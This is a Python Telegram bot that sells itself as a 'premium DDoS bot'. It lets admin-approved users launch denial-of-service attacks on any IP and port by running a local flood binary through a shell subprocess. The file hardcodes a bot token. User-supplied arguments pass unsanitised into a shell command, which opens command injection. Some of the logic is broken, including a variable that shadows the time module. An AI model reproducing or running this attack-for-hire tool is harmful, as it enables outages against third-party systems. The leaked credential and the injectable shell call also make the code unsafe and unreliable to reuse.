import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
import time

TELEGRAM_BOT_TOKEN = '8016978575:AAGtZq2YIQKIdUuDsx-tb8APm5_SPystyTs'
ADMIN_USER_ID = 1662672529
APPROVED_IDS_FILE = 'approved_ids.txt'
attack_in_progress = False
user_cooldowns = {}  # Store user cooldowns (last attack time)
user_feedback_status = {}  # Store feedback status for each user
first_attack_feedback_submitted = {}  # Track if feedback is submitted for the first attack

# Load approved IDs (users and groups) from file
def load_approved_ids():
    try:
        with open(APPROVED_IDS_FILE) as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()

def save_approved_ids(approved_ids):
    with open(APPROVED_IDS_FILE, 'w') as f:
        f.writelines(f"{id_}\n" for id_ in approved_ids)

approved_ids = load_approved_ids()

# Start command
async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐆𝐎𝐃x𝐂𝐇𝐄𝐀𝐓𝐒 𝐃𝐃𝐎𝐒  *\n"
        "*PRIMIUM DDOS BOT*\n"
        "*OWNER :- @GODxAloneBOY*\n"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

# Approve command to approve users and group chat IDs
async def approve(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need admin permission to use this command.*", parse_mode='Markdown')
        return

    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="* Usage » /approve id (user or group chat ID)*", parse_mode='Markdown')
        return

    target_id = args[0].strip()
    approved_ids.add(target_id)
    save_approved_ids(approved_ids)
    await context.bot.send_message(chat_id=chat_id, text=f"*✅ ID {target_id} approved.*", parse_mode='Markdown')

# Remove command to remove approved users and group chat IDs
async def remove(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need admin permission to use this command.*", parse_mode='Markdown')
        return

    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="* Usage » /remove id (user or group chat ID)*", parse_mode='Markdown')
        return

    target_id = args[0].strip()
    if target_id in approved_ids:
        approved_ids.discard(target_id)
        save_approved_ids(approved_ids)
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ ID {target_id} removed.*", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ ID {target_id} is not approved.*", parse_mode='Markdown')

# Attack command (only for approved users and groups)
async def attack(update: Update, context: CallbackContext):
    global attack_in_progress

    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    if str(chat_id) not in approved_ids and user_id not in approved_ids:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need permission to use this bot.*", parse_mode='Markdown')
        return

    if attack_in_progress:
        cooldown_remaining = get_cooldown_remaining(user_id)
        if cooldown_remaining > 0:
            await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ You have {cooldown_remaining} seconds remaining before you can attack again.*", parse_mode='Markdown')
            return
        else:
            await context.bot.send_message(chat_id=chat_id, text="*⚠️ Please wait 3 to 5 minutes for the next attack.*", parse_mode='Markdown')
            return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*  example » /attack ip port time*", parse_mode='Markdown')
        return

    ip, port, time = args
    
    # Check if the user has exceeded the cooldown period
    cooldown_remaining = get_cooldown_remaining(user_id)
    if cooldown_remaining > 0:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ You have {cooldown_remaining} seconds remaining before you can attack again.*", parse_mode='Markdown')
        return

    # Check if feedback is submitted based on the attack count
    if not first_attack_feedback_submitted.get(user_id, False):
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Please submit screenshot feedback for your previous attack before launching another one.*", parse_mode='Markdown')
        return

    await context.bot.send_message(chat_id=chat_id, text=(
        f"*✅ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐋𝐀𝐔𝐍𝐂𝐇𝐄𝐃 ✅*\n"
        f"*⭐ Target » {ip}*\n"
        f"*⭐ Port » {port}*\n"
        f"*⭐ Time » {time} seconds*\n"
        f"*https://t.me/+03wLVBPurPk2NWRl*\n"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, time, context, user_id))

# Run attack function
async def run_attack(chat_id, ip, port, time, context, user_id):
    global attack_in_progress
    attack_in_progress = True

    try:
        process = await asyncio.create_subprocess_shell(
            f"./russian {ip} {port} {time} 500",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        attack_in_progress = False
        # Set the cooldown for the user
        set_cooldown(user_id, int(time))
        if not first_attack_feedback_submitted.get(user_id, False):
            first_attack_feedback_submitted[user_id] = True
            await context.bot.send_message(chat_id=chat_id, text="*✅ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐅𝐈𝐍𝐈𝐒𝐇𝐄𝐃 ✅*\n*SEND FEEDBACK TO OWNER*\n*@GODxAloneBOY*", parse_mode='Markdown')
        else:
            await context.bot.send_message(chat_id=chat_id, text="*✅ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐅𝐈𝐍𝐈𝐒𝐇𝐄𝐃 ✅*", parse_mode='Markdown')

# Function to get remaining cooldown time
def get_cooldown_remaining(user_id):
    last_attack_time = user_cooldowns.get(user_id)
    if last_attack_time:
        cooldown_remaining = last_attack_time + 180 - time.time()
        if cooldown_remaining > 0:
            return cooldown_remaining
    return 0

# Function to set cooldown for a user
def set_cooldown(user_id, cooldown_time):
    user_cooldowns[user_id] = time.time()

# Function to check if feedback is submitted
def is_feedback_submitted(user_id):
    return user_feedback_status.get(user_id, False)

# Function to mark feedback as submitted
def mark_feedback_submitted(user_id):
    user_feedback_status[user_id] = True

# Function to handle feedback submission (you'll need to implement this)
async def handle_feedback_submission(update: Update, context: CallbackContext):
    user_id = str(update.effective_user.id)
    # Process the feedback (e.g., check if it's a valid screenshot)
    # ...
    # Mark feedback as submitted
    mark_feedback_submitted(user_id)
    await context.bot.send_message(chat_id=update.effective_chat.id, text="*✅ Feedback received. You can now launch another attack.*", parse_mode='Markdown')

# Main function
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("remove", remove))
    application.add_handler(CommandHandler("attack", attack))
    # Add a handler for feedback submission (e.g., a command or a message handler)
    # application.add_handler(CommandHandler("feedback", handle_feedback_submission))
    application.run_polling()

if __name__ == '__main__':
    main()
